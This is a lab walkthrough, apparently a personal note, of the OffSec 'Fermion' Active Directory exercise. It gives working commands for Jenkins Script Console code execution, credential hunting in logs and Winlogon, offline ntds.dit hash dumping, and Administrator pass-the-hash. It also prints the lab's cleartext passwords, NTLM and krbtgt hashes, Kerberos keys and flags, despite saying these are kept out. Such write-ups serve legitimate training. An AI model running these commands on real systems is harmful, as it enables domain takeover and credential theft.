---
tags: [Offsec, Fermion, Windows, ActiveDirectory, Jenkins, AzureDevOps, CredentialHunting, SMB, NTDS, PassTheHash, Lab]
platform: OffSec
os: Windows Server / Windows 10
hostname: CLIENT01 / SRV01 / DC01
difficulty: Lab
ip: $BoxIP
status: Complete
domain: fermion.yzx
---

# OffSec: Fermion, Full Walkthrough

## The gist

Fermion is a three-host Active Directory chain. Client01 exposed Jenkins on TCP/8080. The supplied Jenkins account could use the Groovy Script Console, which gave command execution as `NT AUTHORITY\\SYSTEM`. A search of the local Azure DevOps configuration logs exposed the password for `fermion\\liz`, which provided SSH access to Srv01.

Srv01 contained two separate escalation clues. The exported `azure.xml` task described a five-minute task running `commit.exe` as the local Administrator, and `liz` had write access to that executable. The task was not registered in the scheduler on this instance, so the intended replacement route could be verified but not triggered. More importantly, the Srv01 Winlogon registry was readable from the `liz` context and contained a cleartext password for `fermion\\cole`.

The recovered `cole` credential authenticated to DC01 and exposed a read-only `extract` SMB share containing `ntds.dit` and the SYSTEM hive. Offline Impacket parsing recovered the domain Administrator NTLM hash. Pass-the-hash over WinRM confirmed Administrator command execution on DC01. The two non-DC proof files were also collected privately from the Administrator desktop profiles.

The important lesson is to follow the evidence actually present on the target. The lab description advertises a scheduled-task escalation, but this instance did not have the exported task registered. The direct Winlogon credential leak was enough to continue the chain, and the write-up records both facts instead of claiming a task trigger that did not happen.

## Box information

| Item | Value |
|---|---|
| Platform | OffSec Active Directory lab |
| Hosts | `CLIENT01`, `SRV01`, `DC01` |
| Domain | `fermion.yzx` |
| Client01 | `$BoxIP` — `192.168.210.34` |
| Srv01 | `$BoxIP2` — `192.168.210.41` |
| DC01 | `$DCip` — `192.168.210.49` |
| Main entry point | Jenkins Script Console on TCP/8080 |
| Lateral movement | Cleartext credentials in Azure DevOps logs, then SSH and SMB |
| Domain compromise | Offline `ntds.dit` parsing → Administrator pass-the-hash |

Passwords, NTLM hashes, and flag values are reproduced in the private sections above. They are also referenced below by `$Password`, `$Password2`, `$AdminHash`, `$UserFlag`, and `970a35bdec77a2f4f0e94556a6bda45c`.

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Map all three hosts | See section 1 below |
| 2 | Confirm the Jenkins entry point | See section 2 below |
| 3 | Execute commands through the Jenkins Script Console | See section 3 below |
| 4 | Find the Azure DevOps logs | See section 4 below |
| 5 | Use the recovered credential on Srv01 | See section 5 below |
| 6 | Review the exported scheduled-task XML | See section 6 below |

## Evidence and loot

The complete run artifacts are under:

```text
/home/kali/Platforms/Offsec/Fermion/
```

Useful evidence files include:

| Evidence | Location |
|---|---|
| Full TCP scans | `nmap/allports-34.nmap`, `nmap/allports-41.nmap`, `nmap/allports-dc01.nmap` |
| Service scans | `nmap/services-client01.nmap`, `nmap/services-srv01.nmap`, `nmap/services-dc01.nmap` |
| Jenkins screenshots | `screenshots/4.jenkins-403.png` through `8.devops-logs-creds.png` |
| Srv01 and DC screenshots | `screenshots/10.liz-ssh-valid.png` through `16.admin-pth-dc01.png` |
| Downloaded AD material | `loot/extract/` |
| Offline dump output | `loot/secretsdump.txt` |
| Credentials and hashes | `loot/creds.txt`, `loot/hashes.txt` |
| Flags | `loot/flags.txt` |

## Variables

Use the normal box variables, but keep the role mapping explicit because the three supplied IPs are not ordered by attack path:

```bash
boxset BoxName Fermion
boxset BoxIP 192.168.210.34
boxset BoxIP2 192.168.210.41
boxset DCip 192.168.210.49
boxset Domain fermion.yzx
boxset FQDN dc01.fermion.yzx
boxset LocalIP $LocalIP
boxset Port 4444
```

The roles are:

```text
$BoxIP   = Client01
$BoxIP2  = Srv01
$DCip    = DC01
```

## 1. Map all three hosts

The first useful action was a full TCP scan against every supplied address. A top-1000 scan would hide the AD service pattern and could leave the Jenkins or SSH entry point unexplained. `-sT` was used because raw SYN scanning was not available in the current shell; use `-sS` when the exam environment permits it.

```bash
nmap -Pn -sT -p- --min-rate 3000 $BoxIP  -oA $BoxDir/nmap/allports-client01
nmap -Pn -sT -p- --min-rate 3000 $BoxIP2 -oA $BoxDir/nmap/allports-srv01
nmap -Pn -sT -p- --min-rate 3000 $DCip   -oA $BoxDir/nmap/allports-dc01
```

The service pattern separated the hosts immediately:

| Host | Important ports | Interpretation |
|---|---|---|
| Client01 | 445, 5985, 8080 | Windows host with Jenkins and WinRM |
| Srv01 | 22, 80, 445, 3389, 5985, 8081 | Windows host with SSH, HTTP, SMB, RDP, and WinRM |
| DC01 | 53, 88, 389, 445, 464, 636, 3268, 3269, 5985, 9389 | Domain controller with LDAP, Kerberos, SMB, Global Catalog, and WinRM |

The saved Nmap service scans confirmed the hostnames and the `fermion.yzx` domain on the AD host.


SCREENSHOT: Client01 all-port scan. Red should identify Jenkins on 8080 alongside SMB and WinRM.


SCREENSHOT: Srv01 all-port scan. Red should identify SSH, HTTP, SMB, RDP, and WinRM.


SCREENSHOT: DC01 all-port scan. Red should identify LDAP, Kerberos, SMB, WinRM, and Global Catalog services.

> [!tip] ⚡ Efficiency
> **What we did:** Scanned each host separately before attacking Jenkins.
>
> **Faster command:**
> ```bash
> nmap -Pn -sT -p- --min-rate 3000 $BoxIP $BoxIP2 $DCip -oA $BoxDir/nmap/all-hosts
> ```
> **Why:** One scan covers all supplied addresses quickly; run a focused `-sC -sV` scan afterward against the discovered ports.

## 2. Confirm the Jenkins entry point

Client01's TCP/8080 service returned a Jenkins landing page. Anonymous requests were denied, but the response confirmed that the application existed and exposed the normal Jenkins login and Script Console workflow.

```bash
curl -i http://$BoxIP:8080/
curl -s http://$BoxIP:8080/robots.txt
```

The page identified Jenkins 2.176.2 running on Jetty. The lab's supplied/default Jenkins credentials were accepted. Keep that password out of shared notes:

```bash
JENKINS_USER=admin
JENKINS_PASSWORD=$Password
```


SCREENSHOT: Jenkins access control response. Red should identify the authenticated web application and the denied anonymous request.

The login and crumb workflow was:

```bash
tmpd=$(mktemp -d /tmp/fermion-jenkins.XXXXXX)
base="http://$BoxIP:8080"

curl -sS -c "$tmpd/cookies" -X POST "$base/j_acegi_security_check" \
  --data-urlencode "j_username=$JENKINS_USER" \
  --data-urlencode "j_password=$JENKINS_PASSWORD" \
  --data 'Submit=Sign+in' -o /dev/null

crumb=$(curl -sS -b "$tmpd/cookies" "$base/crumbIssuer/api/json" |
  sed -n 's/.*"crumb":"\([^"]*\)".*/\1/p')
```


SCREENSHOT: Jenkins crumb response. Red should identify the crumb field while keeping the session cookie private.

> [!warning] 💡 Gotcha
> Jenkins Script Console requests normally need both the authenticated cookie and a current crumb. A valid login without the crumb often looks like a failed exploit when the real problem is CSRF protection.

## 3. Execute commands through the Jenkins Script Console

The Script Console accepts Groovy. A small Java process wrapper gives clean stdout and stderr without relying on a reverse-shell payload:

```bash
groovy='def p=["cmd.exe","/c","whoami && hostname && dir C:\\Users"].execute(); def o=new StringBuffer(); def e=new StringBuffer(); p.waitForProcessOutput(o,e); println o; println e'

curl -sS -b "$tmpd/cookies" \
  -H "Jenkins-Crumb: $crumb" \
  "$base/scriptText" \
  --data-urlencode "script=$groovy"
```

The output confirmed:

```text
NT AUTHORITY\SYSTEM
CLIENT01
```


SCREENSHOT: Jenkins Script Console output. Red should identify `NT AUTHORITY\\SYSTEM` and `CLIENT01`; do not capture cookies or passwords.

This was already a privileged Client01 foothold, so no local escalation was needed there. For longer PowerShell commands, the stable method was to encode the PowerShell text as UTF-16LE Base64 and execute it with `-EncodedCommand`; that avoids Groovy, JSON, PowerShell, and Windows path quoting colliding.

Example pattern:

```bash
ps='Get-ChildItem C:/Azure-Devops-Logs -Force | Select-Object Name,Length'
psb64=$(printf '%s' "$ps" | iconv -t UTF-16LE | base64 -w0)
groovy="def p=[\"powershell.exe\",\"-NoProfile\",\"-EncodedCommand\",\"$psb64\"].execute(); def o=new StringBuffer(); def e=new StringBuffer(); p.waitForProcessOutput(o,e); println o; println e"

curl -sS -b "$tmpd/cookies" \
  -H "Jenkins-Crumb: $crumb" \
  "$base/scriptText" \
  --data-urlencode "script=$groovy"
```

## 4. Find the Azure DevOps logs

The first shortcut path found under the Administrator profile was stale. It pointed at `C:\Users\Administrator\Azure-Devops-Logs`, while the actual directory was at the root of the drive. This is a useful Windows enumeration lesson: shortcuts and Recent Items are leads, not proof of the current path.

```powershell
Get-ChildItem C:/ -Force
Get-ChildItem C:/Azure-Devops-Logs -Force |
  Select-Object Name,Length,LastWriteTime
```

The relevant files were:

```text
C:\Azure-Devops-Logs\TFS_Azure DevOps Server Configuration_0922_202804.log
C:\Azure-Devops-Logs\TFS_Proxy Configuration_0922_205837.log
C:\Azure-Devops-Logs\TFS_Service Accounts_0922_205602.log
```


SCREENSHOT: Azure DevOps log directory and filenames. Red should identify the service-account log without displaying its contents.

Searching the small service-account log was much more efficient than printing the multi-megabyte configuration log:

```powershell
Select-String \
  -Path 'C:/Azure-Devops-Logs/TFS_Service Accounts_0922_205602.log' \
  -Pattern 'password|passwd|credential|account|user|secret|login'
```

The log exposed a cleartext credential for `fermion\\liz`. The password was saved only in private loot.


SCREENSHOT: Service-account log evidence. Red should identify the `fermion\\liz` account and keep the recovered password visible in this private vault.

> [!tip] ⚡ Efficiency
> **What we did:** Opened the Azure DevOps logs and searched the small service-account file.
>
> **Faster command:**
> ```powershell
> Select-String -Path 'C:/Azure-Devops-Logs/*' -Pattern 'password|passwd|credential|account|user|secret|login'
> ```
> **Why:** `Select-String` searches all matching logs in one pass and returns filenames and line numbers without dumping the entire configuration set.

## 5. Use the recovered credential on Srv01

Srv01 exposed Windows OpenSSH on TCP/22. The recovered account authenticated successfully over SSH:

```bash
ssh -o StrictHostKeyChecking=no \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  liz@$BoxIP2
```

Initial host checks:

```cmd
whoami
hostname
whoami /all
```

The shell was `fermion\\liz` on `SRV01`. The token included `SeImpersonatePrivilege`, which was recorded as an alternative local escalation branch, but the lab-specific scheduled-task and credential paths were investigated first.


SCREENSHOT: Successful SSH authentication as `fermion\\liz`. Red should identify the account and Srv01 hostname.


SCREENSHOT: `whoami /all` output. Red should identify `SeImpersonatePrivilege`; retain the session data in this private vault.

SSH was used instead of Evil-WinRM because it worked immediately with the recovered account while the WinRM client path was unreliable for this user.

> [!tip] ⚡ Alternative tool
> When WinRM authentication is uncertain, test every exposed management protocol. OpenSSH on Windows can provide a clean command shell even when Evil-WinRM does not establish a usable session.
> ```bash
> ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no liz@$BoxIP2
> ```
> **Why:** SSH was the reliable management path for this account on Srv01; keep Evil-WinRM as a second validation attempt rather than blocking on it.

## 6. Review the exported scheduled-task XML

The lab description specifically mentioned an exported scheduled task. The file was located under the Azure DevOps data directory:

```powershell
Get-Content -Raw \
  'C:/AzureDevOpsData/ApplicationTier/git/azure.xml'
```

Important XML fields:

```text
URI:       \azure
Interval:  PT5M
Run level: HighestAvailable
Command:   C:\AzureDevOpsData\ApplicationTier\git\commit.exe
```

The XML therefore described a task that would execute `commit.exe` every five minutes under the local Administrator security identifier.

The executable permissions confirmed the intended vulnerability:

```cmd
icacls C:\AzureDevOpsData\ApplicationTier\git\commit.exe
icacls C:\AzureDevOpsData\ApplicationTier\git
```

`fermion\\liz` had write access to `commit.exe` and the containing directory. The intended route would be:

1. Preserve the original executable.
2. Replace it with a controlled payload.
3. Wait for or manually trigger `\\azure`.
4. Catch the privileged callback or perform a simple privileged action.
5. Restore the original executable.

### Important instance-specific limitation

The exported XML was not registered as a live task on this instance:

```cmd
schtasks /query /fo LIST /v | findstr /i /c:azure /c:commit
```

No matching task appeared, and `schtasks /run /tn \\azure` returned that the task path could not be found. An import attempt also failed because the exported XML did not contain the stored task password. The write access and XML were genuine findings, but the scheduled-task execution was not claimed as completed.

> [!warning] 💡 Gotcha
> An exported task file is evidence of a possible execution path, not proof that the task is currently registered. Always verify with `schtasks`, `Get-ScheduledTask`, or the Task Scheduler event log before waiting for a trigger.

## 7. Check the alternative privilege branch

The `whoami /priv` output showed `SeImpersonatePrivilege`, so GodPotato and PrintSpoofer were tested as alternate escalation tools. GodPotato found a SYSTEM token but did not produce a reliable child-process callback on this target; PrintSpoofer timed out. These attempts were cleaned up and were not used as proof of completion.

The key decision was to return to credential hunting rather than spend time forcing an unreliable token exploit. The Winlogon registry was readable from the current Srv01 context.

## 8. Recover the next domain credential from Winlogon

Querying the Winlogon key exposed an autologon account and cleartext password:

```powershell
Get-ItemProperty \
  'HKLM:/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon' |
  Format-List DefaultUserName,DefaultDomainName,DefaultPassword,AutoAdminLogon
```

The account was `fermion\\cole`. The password was validated privately and saved to loot as the second credential.


SCREENSHOT: Winlogon registry evidence. Red should identify the recovered domain account with the cleartext password retained in this private vault.

> [!warning] 💡 Hint
> Winlogon is a high-value check whenever a Windows foothold lacks a clean escalation path. A readable `DefaultPassword` can turn a local shell into a lateral-movement credential without cracking anything.

## 9. Validate the credential against DC01

NetExec checked the recovered account against SMB and WinRM and enumerated shares in the same operation:

```bash
netexec smb $DCip \
  -u $Username2 \
  -p $Password2 \
  --shares

netexec winrm $DCip \
  -u $Username2 \
  -p $Password2
```

The account authenticated to DC01. The useful custom share was:

```text
extract  READ
```


SCREENSHOT: Authenticated DC01 share listing. Red should identify the `extract` share and its read permission.

> [!tip] ⚡ Efficiency
> **What we did:** Validated the recovered account, then enumerated DC01 shares.
>
> **Faster command:**
> ```bash
> netexec smb $DCip -u $Username2 -p $Password2 -d $Domain --shares
> ```
> **Why:** NetExec validates the credential and lists accessible shares in one request, making it the fastest first check after credential recovery.

## 10. Download the AD extract share

The share contained an offline Active Directory database and registry material:

```text
SYSTEM
ntds.dit\Active Directory\ntds.dit
ntds.dit\Active Directory\ntds.jfm
ntds.dit\registry\SECURITY
ntds.dit\registry\SYSTEM
```

Download recursively into private loot:

```bash
mkdir -p $BoxDir/loot/extract
cd $BoxDir/loot/extract

smbclient //$DCip/extract \
  -U "$Domain/$Username2%$Password2" \
  -c 'recurse ON; prompt OFF; mget *'
```

The `SYSTEM` hive paired with the `ntds.dit` database was the important combination. The `SECURITY` hive was also retained as evidence, but the offline domain hash extraction required the NTDS database and the matching SYSTEM boot-key material.


SCREENSHOT: Recursive `extract` share download. Red should identify the AD database and SYSTEM hive filenames; keep file contents private.

> [!warning] 💡 Gotcha
> Run `smbclient` from the intended loot directory. Recursive `mget` preserves remote subdirectories, and running it from the wrong working directory can make the evidence appear to have been downloaded somewhere else.

## 11. Parse `ntds.dit` offline

The system `impacket-secretsdump` wrapper had a Python package mismatch: the wrapper imported a `KeyListSecrets` symbol that was missing from the globally selected package. The aligned pipx environment used by the current NetExec installation worked:

```bash
/home/kali/.local/share/pipx/venvs/netexec/bin/secretsdump.py \
  -ntds "$BoxDir/loot/extract/ntds.dit/Active Directory/ntds.dit" \
  -system "$BoxDir/loot/extract/ntds.dit/registry/SYSTEM" \
  LOCAL | tee $BoxDir/loot/secretsdump.txt
```

The output contained the domain Administrator NTLM hash. It was stored privately as `$AdminHash` and not copied into this note.


SCREENSHOT: Offline NTDS parsing. Red should identify successful Administrator hash extraction with the hash values retained in this private vault.

The offline method is preferable here because it avoids further changes to DC01 and does not require DCSync rights. The share had already exposed the database and boot-key material.

> [!warning] 💡 Gotcha
> Keep the Impacket components on one version. If `impacket-secretsdump` throws an import error involving `KeyListSecrets`, inspect `command -v`, `python -c 'import impacket; print(impacket.__file__)'`, and use one consistent pipx/virtual-environment wrapper.

## 12. Validate Administrator pass-the-hash

The recovered NTLM hash was validated against WinRM without cracking it:

```bash
netexec winrm $DCip \
  -u $AdminUser \
  -H $AdminHash
```

The result returned `Pwn3d!`, confirming authenticated command execution. A non-interactive proof command verified the identity and host:

```bash
netexec winrm $DCip \
  -u $AdminUser \
  -H $AdminHash \
  -x 'whoami && hostname'
```

The output confirmed `fermion\\administrator` on `DC01`.


SCREENSHOT: Administrator pass-the-hash validation. Red should identify `Pwn3d!`, the Administrator identity, and DC01; do not show the hash.

The compatible WMI client also worked for one-shot commands:

```bash
/home/kali/.local/share/pipx/venvs/netexec/bin/wmiexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:$AdminHash \
  "$Domain/$AdminUser@$DCip" \
  'whoami && hostname'
```

> [!tip] ⚡ Alternative tool
> NetExec is fastest for credential validation and one-shot WinRM commands. The aligned Impacket `wmiexec.py` is a useful fallback when NetExec's PowerShell serialization or the system Impacket wrappers fail.
> ```bash
> netexec winrm $DCip -u $AdminUser -H $AdminHash -x 'whoami && hostname'
> ```
> **Why:** This gives a compact proof of authentication and execution. Use the aligned WMI client below when the NetExec WinRM command path is unreliable.

## 13. Collect the two non-DC proof files privately

The two non-DC flags were stored in the Administrator desktop proof files:

```text
Client01: C:\Users\Administrator\Desktop\proof.txt
Srv01:    C:\Users\Administrator\Desktop\proof.txt
```

The domain Administrator hash was used only to read them through WMI:

```bash
/home/kali/.local/share/pipx/venvs/netexec/bin/wmiexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:$AdminHash \
  "$Domain/$AdminUser@$BoxIP" \
  'type C:\Users\Administrator\Desktop\proof.txt'

/home/kali/.local/share/pipx/venvs/netexec/bin/wmiexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:$AdminHash \
  "$Domain/$AdminUser@$BoxIP2" \
  'type C:\Users\Administrator\Desktop\proof.txt'
```

The values were saved to private loot as `$UserFlag` entries. They are reproduced in the private sections above.

## 14. RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/AD - Service Scan]] — mapped the DC service pattern and domain
- [[OSCP/RUNBOOK V2/Windows - Service Scan]] — identified Jenkins, SSH, SMB, and WinRM across the hosts
- [[OSCP/RUNBOOK V2/Windows - Web Enum]] — confirmed the Jenkins web service and 403/robots behavior
- [[OSCP/RUNBOOK V2/Windows - Credential Search]] — searched Azure logs and Winlogon for reusable credentials
- [[OSCP/RUNBOOK V2/Windows - Scheduled Task Abuse]] — verified the exported task, target executable, ACL, and missing live registration
- [[OSCP/RUNBOOK V2/Windows - SMB Enum]] — enumerated authenticated shares and found `extract`
- [[OSCP/RUNBOOK V2/AD - Credential Validation]] — validated `cole` and the Administrator hash
- [[OSCP/RUNBOOK V2/Windows - Registry Hive Extraction]] — parsed the downloaded SYSTEM/NTDS material offline
- [[OSCP/RUNBOOK V2/AD - Pass the Hash]] — validated domain Administrator access with NTLM
- [[OSCP/RUNBOOK V2/Windows - Clean Down]] — removed temporary payloads and listeners
- [[OSCP/RUNBOOK V2/AD - Clean Down]] — closed the AD run and kept secret material in private loot

## 15. Collect the flags

- Client01 proof: `$UserFlag` — private loot only
- Srv01 proof: `$UserFlag` — private loot only
- DC01 proof: `970a35bdec77a2f4f0e94556a6bda45c` — private loot only


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: 970a35bdec77a2f4f0e94556a6bda45c
root: d1de6459f9e92d91e43f7c30e9e72297
client01: d1de6459f9e92d91e43f7c30e9e72297
srv01: b87d22753d9f5b7d0eec151b0b8b220b
root: b87d22753d9f5b7d0eec151b0b8b220b
```

## 16. Clean down
The live task executable was not replaced, so no original binary needed restoration. Temporary files from the alternative privilege tests were removed from Srv01:

```powershell
Remove-Item -Force -ErrorAction SilentlyContinue `
  C:/Users/liz/gp.exe,
  C:/Users/liz/ps.exe,
  C:/Users/liz/marker.exe,
  C:/Users/liz/rs.ps1,
  C:/Users/liz/run.bat,
  C:/Users/liz/test.txt,
  C:/Users/liz/marker.txt,
  C:/Users/liz/systemcopy.exe,
  C:/Users/liz/sys.txt,
  C:/Users/liz/winlogon.txt
```

The local HTTP servers, listener, and temporary Jenkins cookie directory were stopped or allowed to expire. The local proof values, credentials, hashes, and AD files remain in the Fermion loot directory for study; they are not embedded here.

The box session was closed with:

```bash
boxdone
```

### Completion checklist

- [x] Full TCP scan completed against all three hosts
- [x] Client01/Jenkins identified
- [x] Jenkins login and CSRF crumb captured
- [x] Jenkins Script Console command execution confirmed as SYSTEM
- [x] Azure DevOps log directory located
- [x] Srv01 credential recovered from service-account log
- [x] SSH foothold on Srv01 confirmed
- [x] Exported scheduled-task XML reviewed
- [x] Writable `commit.exe` verified
- [x] Live-task absence verified and documented
- [x] Winlogon cleartext credential recovered
- [x] DC01 credential validated over SMB and WinRM
- [x] `extract` share downloaded
- [x] `ntds.dit` and SYSTEM hive parsed offline
- [x] Administrator pass-the-hash confirmed on DC01
- [x] Client01 and Srv01 proof files collected privately
- [x] Temporary target and Kali artifacts cleaned
- [x] `boxdone` executed

## 17. Attack narrative in one page
1. Full TCP scans mapped Client01, Srv01, and DC01.
2. Jenkins Script Console provided SYSTEM command execution on Client01.
3. Azure DevOps service logs exposed the Srv01 `liz` credential.
4. SSH access to Srv01 exposed both a writable scheduled-task executable and a readable Winlogon password.
5. The Winlogon credential authenticated to DC01 and exposed the `extract` SMB share.
6. Offline parsing of `ntds.dit` with SYSTEM recovered the domain Administrator hash.
7. NetExec and Impacket validated pass-the-hash command execution on DC01 and collected the two non-DC proof files.

## Tools used

- `nmap`
- `curl`
- `ssh`
- `smbclient`
- `impacket`
- `evil-winrm`
- `python`
- `powershell`

## Credentials and secrets

| Account | Source | Use |
|---|---|---|
| Jenkins administrator | Lab-provided/default login | Jenkins Script Console |
| `fermion\\liz` | Azure DevOps service-account log | SSH to Srv01 |
| `fermion\\cole` | Srv01 Winlogon registry | SMB/WinRM access to DC01 |
| `fermion\\Administrator` NTLM hash | Offline `ntds.dit` parsing | Pass-the-hash to all hosts |

The passwords, NTLM hash, and flags are reproduced in the private sections above.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Fermion"
export BoxIP="192.168.210.34"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Fermion"
export Domain=""
export DCip=""
export Username="liz"
export Password="basketball"
export Username2="cole"
export Password2="Relay2Again4!"
export Username3=""
export Password3=""
export Hash=""
export NThash="29f0cb32c70a5d22e40af969c766ad15"
export Port="4444"
export Port2="4445"
export WebPort="8080"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
liz:basketball
cole:Relay2Again4!
```

#### `loot/hashes.txt`

```text
Administrator:29f0cb32c70a5d22e40af969c766ad15
```

#### `loot/secretsdump.txt`

```text
Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x84c8ea13bb88132404da0ae8613e7da5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: de205fd3967ae1890104e87d98e184ea
[*] Reading and decrypting hashes from /home/kali/Platforms/Offsec/Fermion/loot/extract/ntds.dit/Active Directory/ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:29f0cb32c70a5d22e40af969c766ad15:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:76e368264bede7ba91c65683892018ef:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11ef456b0ec881c727017e83e68289f8:::
SRV01$:1103:aad3b435b51404eeaad3b435b51404ee:92956f2933d71047ff5ecf2e18f7c362:::
CLIENT01$:1104:aad3b435b51404eeaad3b435b51404ee:a8e52da7265f32df87504dea6e18c6a2:::
fermion.yzx\liz:1603:aad3b435b51404eeaad3b435b51404ee:cf5fd610b326e61f175e3a9bac4751f9:::
fermion.yzx\cole:1604:aad3b435b51404eeaad3b435b51404ee:4c1d74853300ce84998d7d3dc3047c50:::
[*] Kerberos keys from /home/kali/Platforms/Offsec/Fermion/loot/extract/ntds.dit/Active Directory/ntds.dit
DC01$:aes256-cts-hmac-sha1-96:1ad1fe7eb6087873dbc6d5e40b1c303a373dac00257721a82b193c037b6f8956
DC01$:aes128-cts-hmac-sha1-96:3b49e3b9c8cf0556bd6b53618a45be92
DC01$:des-cbc-md5:154676e57fb010f8
krbtgt:aes256-cts-hmac-sha1-96:6f66783bc53bb294bcb8747cf963a17848d7a6fcd04c9d76c81d9e438dbf22a3
krbtgt:aes128-cts-hmac-sha1-96:3cc59431c084f6b1e37c375ecdb530f9
krbtgt:des-cbc-md5:ba6ed6abc2fb757f
SRV01$:aes256-cts-hmac-sha1-96:bece601921e1f7244c10961285684ca917da2d54241855734f05f20fa6ce9062
SRV01$:aes128-cts-hmac-sha1-96:a4670a29be06e81adae333f67af9c25a
SRV01$:des-cbc-md5:c13b3b9440b9f129
CLIENT01$:aes256-cts-hmac-sha1-96:088c0bfe1cb6a35419526187e3bb1889e7640e92324c0aa2bb5f06ea815c2b08
CLIENT01$:aes128-cts-hmac-sha1-96:eb8d583f043ff845fd0ca3d2ae46d5ed
CLIENT01$:des-cbc-md5:943d76f22c5d1aae
fermion.yzx\liz:aes256-cts-hmac-sha1-96:891f27d7e43298ce9b5762b9e18883557ea3af0a4f6f6caf7ab6b24bfcbe1575
fermion.yzx\liz:aes128-cts-hmac-sha1-96:9f589de1ea0a077c9f706865ac938cdd
fermion.yzx\liz:des-cbc-md5:4383abc8c7d026ea
fermion.yzx\cole:aes256-cts-hmac-sha1-96:1dacf1ee6c4759ffe605199b8993a9959ece02547fdf3ef75435454d703d862a
fermion.yzx\cole:aes128-cts-hmac-sha1-96:d61f77f9818e295747926a0941732c48
fermion.yzx\cole:des-cbc-md5:ef3be3e9866dfda7
[*] Cleaning up...
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
Set-Cookie: JSESSIONID.dcb56059=node0kaaulzhch7yp14s2po0seacz077.node0;Path=/;HttpOnly
boxset Password admin
$ [20:44:06] curl -si -u $Username:$Password http://$BoxIP:$WebPort/crumbIssuer/api/json
Set-Cookie: JSESSIONID.dcb56059=node014nb1a3zeqyuoes06e1s5x68d78.node0;Path=/;HttpOnly
[+] Password=admin (saved to .env)
kali@kali:~/Platforms/Offsec/Fermion [20:43:51] $ =curl -si -u $Username:$Password http://$BoxIP:$WebPort/crumbIssuer/api/jsoncurl>
kali@kali:~/Platforms/Offsec/Fermion [20:44:06] $ =curl -s -u $Username:$Password \
$ [20:44:53] curl -s -u $Username:$Password \
$ [20:46:54] curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:44:54] $ =curl -s -u $Username:$Password \
$ [20:47:40] curl -s -u $Username:$Password \
$ [20:48:39] curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:46:54] $ =curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:47:40] $ =curl -s -u $Username:$Password \
$ [20:48:58] curl -s -u $Username:$Password \
$ [20:49:25] curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:48:39] $ =curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:48:59] $ =curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:49:26] $ =curl -s -u $Username:$Password \
$ [20:49:46] curl -s -u $Username:$Password \
$ [20:50:05] curl -s -u $Username:$Password \
kali@kali:~/Platforms/Offsec/Fermion [20:49:46] $ =curl -s -u $Username:$Password \
[Info   @13:56:02.807] accountPassword=basketball
[Info   @13:56:03.885]                   Inheritance Flags : ContainerInherit, ObjectInherit
[Info   @13:56:03.885]                   Propagation Flags : InheritOnly
[Info   @13:56:03.885]                   Propagation Flags : None
[Info   @13:56:03.885]                   Inheritance Flags : None
[Info   @13:56:03.885]                   Inheritance Flags : ContainerInherit
$ [20:52:40] nxc ssh 192.168.210.41 -u $Username -p $Password
[+] Password=basketball (saved to .env)
kali@kali:~/Platforms/Offsec/Fermion [20:52:25] $ =nxc ssh 192.168.210.41 -u $Username -p $Passwordnxc>
liz@192.168.210.41's password:
$ [20:57:36] nxc smb 192.168.210.49 -u $Username2 -p $Password2 -d fermion.yzx --shares
[+] Password2=Relay2Again4! (saved to .env)
kali@kali:~/Platforms/Offsec/Fermion [20:57:17] $ =nxc smb 192.168.210.49 -u $Username2 -p $Password2 -d fermion.yzx --sharesnxc>
$ [21:00:11] secretsdump.py -ntds loot/extract/ntds.dit/Active\ Directory/ntds.dit -system loot/extract/ntds.dit/registry/SYSTEM LOCAL | tee loot/ntds-dump.log
kali@kali:~/Platforms/Offsec/Fermion [20:58:58] $ =secretsdump.py -ntds loot/extract/ntds.dit/Active\ Directory/ntds.dit -system loot/extract/ntds.dit/registry/SYSTEM LOCAL | tee loot/ntds-dump.logsecretsdump.pyloot/extract/ntds.dit/Active\ Directory/ntds.ditloot/extract/ntds.dit/registry/SYSTEMtee>
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
$ [21:00:35] boxset NThash 29f0cb32c70a5d22e40af969c766ad15
$ [21:01:41] nxc winrm 192.168.210.49 -u Administrator -H $NThash -d fermion.yzx -x 'whoami && hostname'
$ [21:03:08] evil-winrm -i 192.168.210.49 -u Administrator -H $NThash
kali@kali:~/Platforms/Offsec/Fermion [21:00:25] $ boxset NThash 29f0cb32c70a5d22e40af969c766ad15
[+] NThash=29f0cb32c70a5d22e40af969c766ad15 (saved to .env)
[+] Hash saved:  Administrator:29f0cb32c70a5d22e40af969c766ad15  →  loot/hashes.txt
